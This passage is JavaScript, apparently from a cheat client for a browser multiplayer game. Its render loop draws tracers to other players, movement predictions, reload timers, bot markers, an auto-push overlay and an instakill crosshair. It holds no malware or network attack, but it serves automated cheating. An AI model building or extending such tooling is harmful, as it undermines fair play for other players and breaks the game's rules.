    renderCircle(player.x / config.mapScale * mapDisplay.width, player.y / config.mapScale * mapDisplay.height, 7, mapContext, true);
    mapContext.fillStyle = "rgba(255,255,255,0.35)";
    if (player.team && minimapData) {
      for (let _0x48faa3 = 0; _0x48faa3 < minimapData.length;) {
        renderCircle(minimapData[_0x48faa3] / config.mapScale * mapDisplay.width, minimapData[_0x48faa3 + 1] / config.mapScale * mapDisplay.height, 7, mapContext, true);
        _0x48faa3 += 2;
      }
    }
    if (bots.length) {
      bots.forEach(_0x3c43ba => {
        if (_0x3c43ba.inGame) {
          mapContext.globalAlpha = 1;
          mapContext.strokeStyle = "#cc5151";
          renderCircle(_0x3c43ba.x2 / config.mapScale * mapDisplay.width, _0x3c43ba.y2 / config.mapScale * mapDisplay.height, 7, mapContext, false, true);
        }
      });
    }
    if (lastDeath) {
      mapContext.fillStyle = "#fc5553";
      mapContext.font = "34px Hammersmith One";
      mapContext.textBaseline = "middle";
      mapContext.textAlign = "center";
      mapContext.fillText("x", lastDeath.x / config.mapScale * mapDisplay.width, lastDeath.y / config.mapScale * mapDisplay.height);
    }
    if (mapMarker) {
      mapContext.fillStyle = "#fff";
      mapContext.font = "34px Hammersmith One";
      mapContext.textBaseline = "middle";
      mapContext.textAlign = "center";
      mapContext.fillText("x", mapMarker.x / config.mapScale * mapDisplay.width, mapMarker.y / config.mapScale * mapDisplay.height);
    }
  }
}
let crossHairs = ["https://cdn.discordapp.com/attachments/1001384433078779927/1149285738412769300/newawwddd.png", "https://cdn.discordapp.com/attachments/1001384433078779927/1149285168780165170/100px-Crosshairs_Red.png"];
let crossHairSprites = {};
let iconSprites = {};
let icons = ["crown", "skull"];
function loadIcons() {
  for (let _0x5ec564 = 0; _0x5ec564 < icons.length; ++_0x5ec564) {
    let _0x3be68c = new Image();
    _0x3be68c.onload = function () {
      this.isLoaded = true;
    };
    _0x3be68c.src = "./../img/icons/" + icons[_0x5ec564] + ".png";
    iconSprites[icons[_0x5ec564]] = _0x3be68c;
  }
  for (let _0x424886 = 0; _0x424886 < crossHairs.length; ++_0x424886) {
    let _0x2a830c = new Image();
    _0x2a830c.onload = function () {
      this.isLoaded = true;
    };
    _0x2a830c.src = crossHairs[_0x424886];
    crossHairSprites[_0x424886] = _0x2a830c;
  }
}
loadIcons();
function cdf(_0x159b48, _0x87e98a) {
  try {
    return Math.hypot((_0x87e98a.y2 || _0x87e98a.y) - (_0x159b48.y2 || _0x159b48.y), (_0x87e98a.x2 || _0x87e98a.x) - (_0x159b48.x2 || _0x159b48.x));
  } catch (_0x2af229) {
    return Infinity;
  }
}
function updateGame() {
  if (gameObjects.length && inGame) {
    gameObjects.forEach(_0x39ffb7 => {
      if (UTILS.getDistance(_0x39ffb7.x, _0x39ffb7.y, player.x, player.y) <= 1200) {
        if (!liztobj.includes(_0x39ffb7)) {
          liztobj.push(_0x39ffb7);
          _0x39ffb7.render = true;
        }
      } else if (liztobj.includes(_0x39ffb7)) {
        if (UTILS.getDistance(_0x39ffb7.x, _0x39ffb7.y, player.x, player.y) >= 1200) {
          _0x39ffb7.render = false;
          const _0x5d1da2 = liztobj.indexOf(_0x39ffb7);
          if (_0x5d1da2 > -1) {
            liztobj.splice(_0x5d1da2, 1);
          }
        }
      } else if (UTILS.getDistance(_0x39ffb7.x, _0x39ffb7.y, player.x, player.y) >= 1200) {
        _0x39ffb7.render = false;
        const _0x45926a = liztobj.indexOf(_0x39ffb7);
        if (_0x45926a > -1) {
          liztobj.splice(_0x45926a, 1);
        }
      } else {
        _0x39ffb7.render = false;
        const _0x578f05 = liztobj.indexOf(_0x39ffb7);
        if (_0x578f05 > -1) {
          liztobj.splice(_0x578f05, 1);
        }
      }
    });
  }
  mainContext.beginPath();
  mainContext.clearRect(0, 0, gameCanvas.width, gameCanvas.height);
  mainContext.globalAlpha = 1;
  let _0xb30bef;
  if (true) {
    if (getEl("camera").value === "normal") {
      _0xb30bef = 0.1;
    } else if (getEl("camera").value === "medium") {
      _0xb30bef = 0.04;
    } else if (getEl("camera").value === "smooth") {
      _0xb30bef = 0.09;
    }
    if (player) {
      let _0x321bec = player.x + 32;
      let _0x3509f9 = player.y + 32;
      camX += (_0x321bec - camX) * _0xb30bef;
      camY += (_0x3509f9 - camY) * _0xb30bef;
    } else {
      camX = config.mapScale / 2;
      camY = config.mapScale / 2;
    }
  }
  let _0xdadc3b = now - 1000 / config.serverUpdateRate;
  let _0x57d968;
  for (let _0x253f7c = 0; _0x253f7c < players.length + ais.length; ++_0x253f7c) {
    tmpObj = players[_0x253f7c] || ais[_0x253f7c - players.length];
    if (tmpObj && tmpObj.visible) {
      if (tmpObj.forcePos) {
        tmpObj.x = tmpObj.x2;
        tmpObj.y = tmpObj.y2;
        tmpObj.dir = tmpObj.d2;
      } else {
        let _0xf2ff04 = tmpObj.t2 - tmpObj.t1;
        let _0x4f6fbf = _0xdadc3b - tmpObj.t1;
        let _0x5fd40 = _0x4f6fbf / _0xf2ff04;
        let _0x5c8fe1 = 170;
        tmpObj.dt += delta;
        let _0x11fdc0 = Math.min(1.7, tmpObj.dt / _0x5c8fe1);
        _0x57d968 = tmpObj.x2 - tmpObj.x1;
        tmpObj.x = tmpObj.x1 + _0x57d968 * _0x11fdc0;
        _0x57d968 = tmpObj.y2 - tmpObj.y1;
        tmpObj.y = tmpObj.y1 + _0x57d968 * _0x11fdc0;
        if (config.anotherVisual) {
          tmpObj.dir = Math.lerpAngle(tmpObj.d2, tmpObj.d1, Math.min(1.2, _0x5fd40));
        } else {
          tmpObj.dir = Math.lerpAngle(tmpObj.d2, tmpObj.d1, Math.min(1.2, _0x5fd40));
        }
      }
    }
  }
  let _0x245cb1 = camX - maxScreenWidth / 2;
  let _0x560012 = camY - maxScreenHeight / 2;
  if (config.snowBiomeTop - _0x560012 <= 0 && config.mapScale - config.snowBiomeTop - _0x560012 >= maxScreenHeight) {
    mainContext.fillStyle = "#b6db66";
    mainContext.fillRect(0, 0, maxScreenWidth, maxScreenHeight);
  } else if (config.mapScale - config.snowBiomeTop - _0x560012 <= 0) {
    mainContext.fillStyle = "#dbc666";
    mainContext.fillRect(0, 0, maxScreenWidth, maxScreenHeight);
  } else if (config.snowBiomeTop - _0x560012 >= maxScreenHeight) {
    mainContext.fillStyle = "#fff";
    mainContext.fillRect(0, 0, maxScreenWidth, maxScreenHeight);
  } else if (config.snowBiomeTop - _0x560012 >= 0) {
    mainContext.fillStyle = "#fff";
    mainContext.fillRect(0, 0, maxScreenWidth, config.snowBiomeTop - _0x560012);
    mainContext.fillStyle = "#b6db66";
    mainContext.fillRect(0, config.snowBiomeTop - _0x560012, maxScreenWidth, maxScreenHeight - (config.snowBiomeTop - _0x560012));
  } else {
    mainContext.fillStyle = "#b6db66";
    mainContext.fillRect(0, 0, maxScreenWidth, config.mapScale - config.snowBiomeTop - _0x560012);
    mainContext.fillStyle = "#dbc666";
    mainContext.fillRect(0, config.mapScale - config.snowBiomeTop - _0x560012, maxScreenWidth, maxScreenHeight - (config.mapScale - config.snowBiomeTop - _0x560012));
  }
  if (!firstSetup) {
    waterMult += waterPlus * config.waveSpeed * delta;
    if (waterMult >= config.waveMax) {
      waterMult = config.waveMax;
      waterPlus = -1;
    } else if (waterMult <= 1) {
      waterMult = waterPlus = 1;
    }
    mainContext.globalAlpha = 1;
    mainContext.fillStyle = "#dbc666";
    renderWaterBodies(_0x245cb1, _0x560012, mainContext, config.riverPadding);
    mainContext.fillStyle = "#91b2db";
    renderWaterBodies(_0x245cb1, _0x560012, mainContext, (waterMult - 1) * 250);
  }
  mainContext.globalAlpha = 1;
  mainContext.strokeStyle = outlineColor;
  renderDeadPlayers(_0x245cb1, _0x560012);
  mainContext.globalAlpha = 1;
  mainContext.strokeStyle = outlineColor;
  renderGameObjects(-1, _0x245cb1, _0x560012);
  mainContext.globalAlpha = 1;
  mainContext.lineWidth = outlineWidth;
  renderProjectiles(0, _0x245cb1, _0x560012);
  renderPlayers(_0x245cb1, _0x560012, 0);
  mainContext.globalAlpha = 1;
  for (let _0x1fe8b0 = 0; _0x1fe8b0 < ais.length; ++_0x1fe8b0) {
    tmpObj = ais[_0x1fe8b0];
    if (tmpObj.active && tmpObj.visible) {
      tmpObj.animate(delta);
      mainContext.save();
      mainContext.translate(tmpObj.x - _0x245cb1, tmpObj.y - _0x560012);
      mainContext.rotate(tmpObj.dir + tmpObj.dirPlus - Math.PI / 2);
      renderAI(tmpObj, mainContext);
      mainContext.restore();
    }
  }
  renderGameObjects(0, _0x245cb1, _0x560012);
  renderProjectiles(1, _0x245cb1, _0x560012);
  renderGameObjects(1, _0x245cb1, _0x560012);
  renderPlayers(_0x245cb1, _0x560012, 1);
  renderGameObjects(2, _0x245cb1, _0x560012);
  renderGameObjects(3, _0x245cb1, _0x560012);
  mainContext.fillStyle = "#000";
  mainContext.globalAlpha = 0.09;
  if (_0x245cb1 <= 0) {
    mainContext.fillRect(0, 0, -_0x245cb1, maxScreenHeight);
  }
  if (config.mapScale - _0x245cb1 <= maxScreenWidth) {
    let _0x418774 = Math.max(0, -_0x560012);
    mainContext.fillRect(config.mapScale - _0x245cb1, _0x418774, maxScreenWidth - (config.mapScale - _0x245cb1), maxScreenHeight - _0x418774);
  }
  if (_0x560012 <= 0) {
    mainContext.fillRect(-_0x245cb1, 0, maxScreenWidth + _0x245cb1, -_0x560012);
  }
  if (config.mapScale - _0x560012 <= maxScreenHeight) {
    let _0x45ae14 = Math.max(0, -_0x245cb1);
    let _0x117468 = 0;
    if (config.mapScale - _0x245cb1 <= maxScreenWidth) {
      _0x117468 = maxScreenWidth - (config.mapScale - _0x245cb1);
    }
    mainContext.fillRect(_0x45ae14, config.mapScale - _0x560012, maxScreenWidth - _0x45ae14 - _0x117468, maxScreenHeight - (config.mapScale - _0x560012));
  }
  mainContext.globalAlpha = 1;
  mainContext.fillStyle = "rgba(0, 5, 80, 0.55)";
  mainContext.fillRect(0, 0, maxScreenWidth, maxScreenHeight);
  mainContext.strokeStyle = darkOutlineColor;
  mainContext.globalAlpha = 1;
  for (let _0x52099b = 0; _0x52099b < players.length + ais.length; ++_0x52099b) {
    tmpObj = players[_0x52099b] || ais[_0x52099b - players.length];
    if (tmpObj.visible && tmpObj.showName === "NOOO") {
      mainContext.strokeStyle = darkOutlineColor;
      let _0x18a89a = (tmpObj.team ? "[" + tmpObj.team + "] " : "") + tmpObj.name + (tmpObj.isPlayer ? " {" + tmpObj.sid + "}" : "");
      if (_0x18a89a != "" && tmpObj.name != "Cry for me") {
        mainContext.font = (tmpObj.nameScale || 30) + "px Hammersmith One";
        mainContext.fillStyle = "#fff";
        mainContext.textBaseline = "middle";
        mainContext.textAlign = "center";
        mainContext.lineWidth = tmpObj.nameScale ? 11 : 8;
        mainContext.lineJoin = "round";
        mainContext.strokeText(_0x18a89a, tmpObj.x - _0x245cb1, tmpObj.y - _0x560012 - tmpObj.scale - config.nameY);
        mainContext.fillText(_0x18a89a, tmpObj.x - _0x245cb1, tmpObj.y - _0x560012 - tmpObj.scale - config.nameY);
        if (tmpObj.isLeader && iconSprites.crown.isLoaded) {
          let _0x1bed48 = config.crownIconScale;
          let _0x2a63f3 = tmpObj.x - _0x245cb1 - _0x1bed48 / 2 - mainContext.measureText(_0x18a89a).width / 2 - config.crownPad;
          mainContext.drawImage(iconSprites.crown, _0x2a63f3, tmpObj.y - _0x560012 - tmpObj.scale - config.nameY - _0x1bed48 / 2 - 5, _0x1bed48, _0x1bed48);
        }
        if (tmpObj.iconIndex == 1 && iconSprites.skull.isLoaded) {
          let _0x5cc916 = config.crownIconScale;
          let _0x48a3b6 = tmpObj.x - _0x245cb1 - _0x5cc916 / 2 + mainContext.measureText(_0x18a89a).width / 2 + config.crownPad;
          mainContext.drawImage(iconSprites.skull, _0x48a3b6, tmpObj.y - _0x560012 - tmpObj.scale - config.nameY - _0x5cc916 / 2 - 5, _0x5cc916, _0x5cc916);
        }
        if (tmpObj.isPlayer && instaC.wait && near == tmpObj && (tmpObj.backupNobull ? crossHairSprites[1].isLoaded : crossHairSprites[0].isLoaded) && enemy.length && !useWasd) {
          let _0x5ced6c = tmpObj.scale * 2.2;
          mainContext.drawImage(tmpObj.backupNobull ? crossHairSprites[1] : crossHairSprites[0], tmpObj.x - _0x245cb1 - _0x5ced6c / 2, tmpObj.y - _0x560012 - _0x5ced6c / 2, _0x5ced6c, _0x5ced6c);
        }
      }
      if (tmpObj.health > 0) {
        if (tmpObj.name != "Cry for me") {
          mainContext.fillStyle = darkOutlineColor;
          mainContext.roundRect(tmpObj.x - _0x245cb1 - config.healthBarWidth - config.healthBarPad, tmpObj.y - _0x560012 + tmpObj.scale + config.nameY, config.healthBarWidth * 2 + config.healthBarPad * 2, 17, 8);
          mainContext.fill();
          mainContext.fillStyle = tmpObj == player || tmpObj.team && tmpObj.team == player.team ? "#8ecc51" : "#cc5151";
          mainContext.roundRect(tmpObj.x - _0x245cb1 - config.healthBarWidth, tmpObj.y - _0x560012 + tmpObj.scale + config.nameY + config.healthBarPad, config.healthBarWidth * 2 * (tmpObj.health / tmpObj.maxHealth), 17 - config.healthBarPad * 2, 20);
          mainContext.fill();
        }
        if (tmpObj.isPlayer) {
          mainContext.globalAlpha = 1;
          let _0x432a68 = {
            primary: tmpObj.primaryIndex == undefined ? 1 : (items.weapons[tmpObj.primaryIndex].speed - tmpObj.reloads[tmpObj.primaryIndex]) / items.weapons[tmpObj.primaryIndex].speed,
            secondary: tmpObj.secondaryIndex == undefined ? 1 : (items.weapons[tmpObj.secondaryIndex].speed - tmpObj.reloads[tmpObj.secondaryIndex]) / items.weapons[tmpObj.secondaryIndex].speed,
            turret: (2500 - tmpObj.reloads[53]) / 2500
          };
          if (!tmpObj.currentReloads) {
            tmpObj.currentReloads = {
              primary: _0x432a68.primary,
              secondary: _0x432a68.secondary,
              turret: _0x432a68.turret
            };
          }
          const _0x3b95ed = 0.3;
          tmpObj.currentReloads.primary = (1 - _0x3b95ed) * tmpObj.currentReloads.primary + _0x3b95ed * _0x432a68.primary;
          tmpObj.currentReloads.secondary = (1 - _0x3b95ed) * tmpObj.currentReloads.secondary + _0x3b95ed * _0x432a68.secondary;
          tmpObj.currentReloads.turret = (1 - _0x3b95ed) * tmpObj.currentReloads.turret + _0x3b95ed * _0x432a68.turret;
          let _0x438043 = tmpObj.primaryIndex !== undefined ? (items.weapons[tmpObj.primaryIndex].speed - tmpObj.reloads[tmpObj.primaryIndex]) / items.weapons[tmpObj.primaryIndex].speed : 1;
          let _0x1ece7a = tmpObj.secondaryIndex !== undefined ? (items.weapons[tmpObj.secondaryIndex].speed - tmpObj.reloads[tmpObj.secondaryIndex]) / items.weapons[tmpObj.secondaryIndex].speed : 1;
          const _0x24bd57 = tmpObj.x - _0x245cb1;
          const _0x3a75f6 = tmpObj.y - _0x560012;
          const _0x102ff8 = 35;
          const _0x2c9a05 = 15;
          const _0x435033 = Math.PI * 2 / 3;
          const _0x3ff09b = -Math.PI / 2 + Math.PI / 3 + tmpObj.dir - Math.PI / 2;
          const _0x250dad = _0x3ff09b + _0x435033 * tmpObj.currentReloads.secondary;
          const _0x18e257 = Math.PI / 2 + tmpObj.dir - Math.PI / 2;
          const _0x7cebbf = _0x18e257 + _0x435033 * tmpObj.currentReloads.primary;
          const _0x420583 = Math.PI + Math.PI / 4.5 + tmpObj.dir - Math.PI / 2;
          const _0xd8bd04 = _0x420583 + _0x435033 / 1.25 * tmpObj.currentReloads.turret;
          function _0x2451e(_0x24732e) {
            const _0x2501f5 = 255;
            return "rgb(" + _0x2501f5 + ", " + _0x2501f5 + ", " + _0x2501f5 + ")";
          }
          mainContext.save();
          if (tmpObj.currentReloads.primary < 0.999) {
            mainContext.beginPath();
            mainContext.lineCap = "round";
            mainContext.arc(_0x24bd57, _0x3a75f6, _0x102ff8, _0x18e257, _0x7cebbf);
            mainContext.lineWidth = 4;
            mainContext.strokeStyle = _0x2451e(tmpObj.currentReloads.primary * 240);
            mainContext.stroke();
          }
          if (tmpObj.currentReloads.secondary < 0.999) {
            mainContext.beginPath();
            mainContext.lineCap = "round";
            mainContext.arc(_0x24bd57, _0x3a75f6, _0x102ff8, _0x3ff09b, _0x250dad);
            mainContext.lineWidth = 4;
            mainContext.strokeStyle = _0x2451e(tmpObj.currentReloads.secondary * 240);
            mainContext.stroke();
          }
          if (tmpObj.currentReloads.turret < 0.999) {
            mainContext.beginPath();
            mainContext.lineCap = "round";
            mainContext.arc(_0x24bd57, _0x3a75f6, _0x102ff8, _0x420583, _0xd8bd04);
            mainContext.lineWidth = 4;
            mainContext.strokeStyle = _0x2451e(tmpObj.currentReloads.turret * 240);
            mainContext.stroke();
          }
          mainContext.restore();
          if (tmpObj.name != " ") {
            mainContext.globalAlpha = 1;
            mainContext.font = "24px Hammersmith One";
            mainContext.strokeStyle = darkOutlineColor;
            mainContext.textBaseline = "middle";
            mainContext.textAlign = "center";
            mainContext.lineWidth = 8;
            mainContext.lineJoin = "round";
            let _0x621ee4 = config.crownIconScale;
            let _0x332651 = tmpObj.x - _0x245cb1 - _0x621ee4 / 2 + config.crownPad - 2;
            let _0x1c3b45 = tmpObj.skinIndex == 45 && tmpObj.shameTimer > 0 ? tmpObj.shameTimer : tmpObj.shameCount;
            let _0x4f353a = _0x332651 - 1;
            let _0x3896f6 = tmpObj.y - _0x560012 - tmpObj.scale - config.nameY + 170;
            if (tmpObj.skinIndex == 45) {
              mainContext.fillStyle = "black";
            } else if (_0x1c3b45 >= 2 && _0x1c3b45 <= 3) {
              mainContext.fillStyle = "yellow";
            } else if (_0x1c3b45 >= 4 && _0x1c3b45 <= 5) {
              mainContext.fillStyle = "orange";
            } else if (_0x1c3b45 >= 6 && _0x1c3b45 <= 7) {
              mainContext.fillStyle = "red";
            } else {
              mainContext.fillStyle = "#fff";
            }
            mainContext.strokeText(_0x1c3b45, _0x4f353a, _0x3896f6);
            mainContext.fillText(_0x1c3b45, _0x4f353a, _0x3896f6);
          }
          if (tmpObj.isPlayer && tmpObj.sid !== player.sid) {
            let _0xd593df;
            let _0x4e5af9;
            if (tmpObj.team && tmpObj.team === player.team) {
              _0xd593df = "rgba(81, 102, 204, 0.5)";
              _0x4e5af9 = "rgba(81, 102, 204, 1)";
            } else {
              _0xd593df = "rgba(204, 81, 81, 0.5)";
              _0x4e5af9 = "rgba(204, 81, 81, 1)";
            }
            mainContext.save();
            const _0x219f98 = mainContext.canvas.getContext("2d");
            _0x219f98.strokeStyle = _0x4e5af9;
            _0x219f98.lineWidth = 3;
            _0x219f98.lineJoin = "round";
            _0x219f98.beginPath();
            _0x219f98.moveTo(player.x - _0x245cb1, player.y - _0x560012);
            _0x219f98.lineTo(tmpObj.x - _0x245cb1, tmpObj.y - _0x560012);
            _0x219f98.stroke();
            _0x219f98.closePath();
            for (let _0x1defd5 = 0; _0x1defd5 < 3; _0x1defd5++) {
              _0x219f98.strokeStyle = _0xd593df;
              _0x219f98.lineWidth = 10 + _0x1defd5 * 5;
              _0x219f98.globalAlpha = 0.3 - _0x1defd5 * 0.1;
              _0x219f98.stroke();
            }
            mainContext.restore();
            mainContext.fillStyle = "white";
            mainContext.font = "bold 12px Arial";
            const _0x49dea4 = tmpObj.name;
            const _0x3035e2 = mainContext.measureText(_0x49dea4).width;
            const _0x216e5e = (player.x + tmpObj.x - _0x245cb1 * 2) / 2;
            const _0x16133a = (player.y + tmpObj.y - _0x560012 * 2) / 2;
            mainContext.save();
            mainContext.translate(_0x216e5e, _0x16133a);
            const _0x17ee59 = tmpObj.x - player.x;
            const _0x2c9a1d = tmpObj.y - player.y;
            const _0x5477f8 = Math.atan2(_0x2c9a1d, _0x17ee59);
            mainContext.rotate(_0x5477f8 - Math.PI / 2);
            mainContext.rotate(-Math.PI / 2);
            mainContext.fillText(_0x49dea4, 0, 0);
            mainContext.restore();
            mainContext.shadowColor = "transparent";
            mainContext.shadowBlur = 1;
          }
          if (getEl("predictType").value == "pre2") {
            mainContext.lineWidth = 3;
            mainContext.strokeStyle = "#fff";
            mainContext.globalAlpha = 1;
            mainContext.beginPath();
            let _0x405915 = {
              x: tmpObj.x2 - _0x245cb1,
              y: tmpObj.y2 - _0x560012
            };
            mainContext.moveTo(tmpObj.x - _0x245cb1, tmpObj.y - _0x560012);
            mainContext.lineTo(_0x405915.x, _0x405915.y);
            mainContext.stroke();
          } else if (getEl("predictType").value == "pre3") {
            mainContext.lineWidth = 3;
            mainContext.strokeStyle = "#cc5151";
            mainContext.globalAlpha = 1;
            mainContext.beginPath();
            let _0xa563b7 = {
              x: tmpObj.x3 - _0x245cb1,
              y: tmpObj.y3 - _0x560012
            };
            mainContext.moveTo(tmpObj.x - _0x245cb1, tmpObj.y - _0x560012);
            mainContext.lineTo(_0xa563b7.x, _0xa563b7.y);
            mainContext.stroke();
          }
        }
      }
    }
  }
  if (player) {
    if (my.autoPush && my.pushData) {
      mainContext.lineWidth = 5;
      mainContext.globalAlpha = 1;
      mainContext.beginPath();
      mainContext.strokeStyle = "white";
      var _0xf06447 = player.x - _0x245cb1;
      var _0x3c9433 = player.y - _0x560012;
      var _0x304059 = my.pushData.x2 - _0x245cb1;
      var _0x3568a7 = my.pushData.y2 - _0x560012;
      var _0x378a5c = my.pushData.x - _0x245cb1;
      var _0x4d4f53 = my.pushData.y - _0x560012;
      mainContext.moveTo(_0xf06447, _0x3c9433);
      mainContext.lineTo(_0x304059, _0x3568a7);
      mainContext.lineTo(_0x378a5c, _0x4d4f53);
      mainContext.stroke();
      var _0x2a6ab9 = _0x378a5c - _0xf06447;
      var _0x19cef8 = _0x4d4f53 - _0x3c9433;
      var _0x55a6ad = Math.sqrt(_0x2a6ab9 * _0x2a6ab9 + _0x19cef8 * _0x19cef8);
      var _0x5bdbf7 = 100;
      var _0x52fd31 = _0x55a6ad / _0x5bdbf7 * 100;
      _0x52fd31 = Math.min(100, Math.max(0, _0x52fd31));
      let _0x828302;
      mainContext.fillStyle = "white";
      mainContext.strokeStyle = "black";
      mainContext.lineWidth = 5;
      mainContext.font = "30px Hammersmith One";
      let _0x51aeb1 = liztobj.filter(_0x319b29 => _0x319b29.trap && _0x319b29.active && _0x319b29.isTeamObject(player) && UTILS.getDist(_0x319b29, near, 0, 2) <= near.scale + _0x319b29.getScale() + 5).sort(function (_0x1f2d9b, _0x942d6b) {
        return UTILS.getDist(_0x1f2d9b, near, 0, 2) - UTILS.getDist(_0x942d6b, near, 0, 2);
      })[0];
      if (_0x51aeb1) {
        _0x828302 = liztobj.filter(_0x14d4ce => _0x14d4ce.dmg && _0x14d4ce.active && _0x14d4ce.isTeamObject(player) && UTILS.getDist(_0x14d4ce, _0x51aeb1, 0, 0) <= near.scale + _0x51aeb1.scale + _0x14d4ce.scale).sort(function (_0x103f60, _0x4df47e) {
          return UTILS.getDist(_0x103f60, near, 0, 2) - UTILS.getDist(_0x4df47e, near, 0, 2);
        })[0];
      }
      let _0x4fe1a2 = (player.x - _0x245cb1 + near.x - _0x245cb1) / 2;
      let _0xc484a6 = (player.y - _0x560012 + near.y - _0x560012) / 2;
      mainContext.moveTo(player.x - _0x245cb1, player.y - _0x560012);
      mainContext.strokeText(near.aim2, _0x4fe1a2, _0xc484a6);
      mainContext.fillText(near.aim2, _0x4fe1a2, _0xc484a6);
    }
  }
  if (getEl("funni").checked && petals.length) {
    player.spinDir += 2.5 / 60;
    let _0x23c9f7 = 0;
    if (clicks.left) {
      _0x23c9f7 = 50;
    } else if (clicks.right) {
      _0x23c9f7 = 15;
    } else {
      _0x23c9f7 = 40;
    }
    _0x23c9f7 += player.scale;
    petals.forEach((_0x4671ad, _0x5897da) => {
      if (_0x4671ad.active) {
        let _0x171fd0 = Math.PI * (_0x5897da / (petals.length / 2));
        let _0x43d9c1 = {
          x: player.x + _0x23c9f7 * Math.cos(player.spinDir + _0x171fd0),
          y: player.y + _0x23c9f7 * Math.sin(player.spinDir + _0x171fd0)
        };
        let _0x3be8ca = UTILS.getDirect(_0x43d9c1, _0x4671ad, 0, 0);
        let _0x2a51c4 = UTILS.getDist(_0x43d9c1, _0x4671ad, 0, 0);
        _0x4671ad.x += _0x2a51c4 / 7 * Math.cos(_0x3be8ca);
        _0x4671ad.y += _0x2a51c4 / 7 * Math.sin(_0x3be8ca);
        players.filter(_0x5c5e79 => _0x5c5e79.visible && _0x5c5e79 != player).forEach(_0x26d606 => {
          let _0x180a72 = UTILS.getDirect(_0x4671ad, _0x26d606, 0, 0);
          let _0x183934 = UTILS.getDist(_0x4671ad, _0x26d606, 0, 0);
          let _0x3e28c6 = _0x4671ad.scale + _0x26d606.scale;
          if (_0x183934 <= _0x3e28c6) {
            let _0x1398a3 = _0x183934 - _0x3e28c6;
            let _0x396a14 = -_0x1398a3;
            _0x4671ad.x += _0x396a14 * Math.cos(_0x180a72);
            _0x4671ad.y += _0x396a14 * Math.sin(_0x180a72);
            _0x4671ad.health -= 10;
            _0x4671ad.damaged += 125;
            if (_0x4671ad.health <= 0) {
              _0x4671ad.active = false;
            }
          }
        });
      } else {
        _0x4671ad.time += delta;
        if (_0x4671ad.alive) {
          _0x4671ad.alpha -= delta / 200;
          _0x4671ad.visScale += delta / (_0x4671ad.scale * 2);
          if (_0x4671ad.alpha <= 0) {
            _0x4671ad.alpha = 0;
            _0x4671ad.alive = false;
          }
        }
        if (_0x4671ad.time >= _0x4671ad.timer) {
          _0x4671ad.time = 0;
          _0x4671ad.active = true;
          _0x4671ad.alive = true;
          _0x4671ad.x = player.x;
          _0x4671ad.y = player.y;
          _0x4671ad.health = _0x4671ad.maxHealth;
          _0x4671ad.damaged = 0;
          _0x4671ad.alpha = 1;
          _0x4671ad.visScale = _0x4671ad.scale;
        }
      }
      if (_0x4671ad.alive) {
        let _0x2b665e = function (_0x2a95d5, _0x12b90f, _0x15cf14, _0x4c65f8) {
          let _0x32bc1b = Math.max(0, _0x2a95d5 - Math.floor(_0x4c65f8));
          let _0x4731fe = Math.max(0, _0x12b90f - Math.floor(_0x4c65f8));
          let _0x4c30e0 = Math.max(0, _0x15cf14 - Math.floor(_0x4c65f8));
          return "rgb(" + (_0x32bc1b + ", " + _0x4731fe + ", " + _0x4c30e0) + ")";
        };
        mainContext.globalAlpha = _0x4671ad.alpha;
        mainContext.lineWidth = 3;
        mainContext.beginPath();
        mainContext.arc(_0x4671ad.x - _0x245cb1, _0x4671ad.y - _0x560012, _0x4671ad.visScale, 0, Math.PI * 2);
        if (clicks.left) {
          mainContext.fillStyle = _0x2b665e(150, 0, 0, _0x4671ad.damaged);
        } else if (clicks.right) {
          mainContext.fillStyle = _0x2b665e(0, 0, 150, _0x4671ad.damaged);
        } else {
          mainContext.fillStyle = _0x2b665e(0, 0, 0, _0x4671ad.damaged);
        }
        mainContext.fill();
        mainContext.lineWidth = 3;
        mainContext.strokeStyle = "white ";
        mainContext.stroke();
        _0x4671ad.damaged = Math.max(0, _0x4671ad.damaged - delta / 2);
      }
    });
  }
  mainContext.globalAlpha = 1;
  textManager.update(delta, mainContext, _0x245cb1, _0x560012);
  for (let _0xf4051e = 0; _0xf4051e < players.length; ++_0xf4051e) {
    tmpObj = players[_0xf4051e];
    if (tmpObj.visible) {
      if (tmpObj.chatCountdown > 0) {
        tmpObj.chatCountdown -= delta;
        if (tmpObj.chatCountdown <= 0) {
          tmpObj.chatCountdown = 0;
        }
        mainContext.font = "32px Hammersmith One";
        let _0x114820 = mainContext.measureText(tmpObj.chatMessage);
        mainContext.textBaseline = "middle";
        mainContext.textAlign = "center";
        let _0x10e9d3 = tmpObj.x - _0x245cb1;
        let _0x5cc13f = tmpObj.y - tmpObj.scale - _0x560012 - 90;
        let _0x281150 = 47;
        let _0x68be72 = _0x114820.width + 17;
        mainContext.fillStyle = "rgba(0,0,0,0.2)";
        mainContext.roundRect(_0x10e9d3 - _0x68be72 / 2, _0x5cc13f - _0x281150 / 2, _0x68be72, _0x281150, 6);
        mainContext.fill();
        mainContext.fillStyle = "#fff";
        mainContext.fillText(tmpObj.chatMessage, _0x10e9d3, _0x5cc13f);
      }
      if (tmpObj.chat.count > 0) {
        if (!useWasd) {
          tmpObj.chat.count -= delta;
          if (tmpObj.chat.count <= 0) {
            tmpObj.chat.count = 0;
          }
          mainContext.font = "32px Hammersmith One";
          let _0x30707b = mainContext.measureText(tmpObj.chat.message);
          mainContext.textBaseline = "middle";
          mainContext.textAlign = "center";
          let _0x1a212f = tmpObj.x - _0x245cb1;
          let _0x3410f8 = tmpObj.y - tmpObj.scale - _0x560012 + 180;
          let _0x2b1c35 = 47;
          let _0x7a3e74 = _0x30707b.width + 17;
          mainContext.fillStyle = "rgba(0,0,0,0.2)";
          mainContext.roundRect(_0x1a212f - _0x7a3e74 / 2, _0x3410f8 - _0x2b1c35 / 2, _0x7a3e74, _0x2b1c35, 6);
          mainContext.fill();
          mainContext.fillStyle = "#ffffff99";
          mainContext.fillText(tmpObj.chat.message, _0x1a212f, _0x3410f8);
        } else {
          tmpObj.chat.count = 0;
        }
      }
    }
  }
  if (allChats.length) {
    allChats.filter(_0x412cf3 => _0x412cf3.active).forEach(_0x5b2fbc => {
      if (!_0x5b2fbc.alive) {
        if (_0x5b2fbc.alpha <= 1) {
          _0x5b2fbc.alpha += delta / 250;
          if (_0x5b2fbc.alpha >= 1) {
            _0x5b2fbc.alpha = 1;
            _0x5b2fbc.alive = true;
          }
        }
      } else {
        _0x5b2fbc.alpha -= delta / 5000;
        if (_0x5b2fbc.alpha <= 0) {
          _0x5b2fbc.alpha = 0;
          _0x5b2fbc.active = false;
        }
      }
      if (_0x5b2fbc.active) {
        mainContext.font = "20px Ubuntu";
        let _0x5b39ff = mainContext.measureText(_0x5b2fbc.chat);
        mainContext.textBaseline = "middle";
        mainContext.textAlign = "center";
